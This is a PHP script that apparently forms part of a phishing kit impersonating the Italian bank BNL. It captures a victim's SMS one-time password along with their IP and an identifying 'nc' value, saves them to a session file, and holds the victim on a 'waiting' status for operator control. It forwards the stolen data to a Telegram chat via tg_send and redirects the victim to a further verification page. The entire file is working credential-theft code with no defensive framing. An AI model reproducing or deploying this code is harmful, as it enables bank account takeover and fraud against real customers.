<?php
require_once __DIR__ . '/telegram_config.php';

$id  = $_POST['id'] ?? '';
$otp = trim($_POST['otp_sms'] ?? '');

if (!$id) { header('Location: index.html'); exit; }

$df = __DIR__ . '/data.json';
$data = file_exists($df) ? json_decode(file_get_contents($df), true) : ['sessions' => []];

if (isset($data['sessions'][$id])) {
    $data['sessions'][$id]['otp_sms']        = $otp;
    $data['sessions'][$id]['status']         = 'waiting';
    $data['sessions'][$id]['next_page']      = '';
    $data['sessions'][$id]['force_redirect'] = 0;            // ← RESET
    $data['sessions'][$id]['updated_at']     = date('Y-m-d H:i:s');
    file_put_contents($df, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

    $nc = $data['sessions'][$id]['nc'];
    $ip = $data['sessions'][$id]['ip'];
    $msg = "<b>BNL OTP SMS</b>\n"
         . "ID: <code>{$id}</code>\n"
         . "IP: {$ip}\n"
         . "NC: <code>{$nc}</code>\n"
         . "OTP: <code>{$otp}</code>";
    tg_send($msg);
}

header("Location: verifica.php?id=" . urlencode($id));
exit;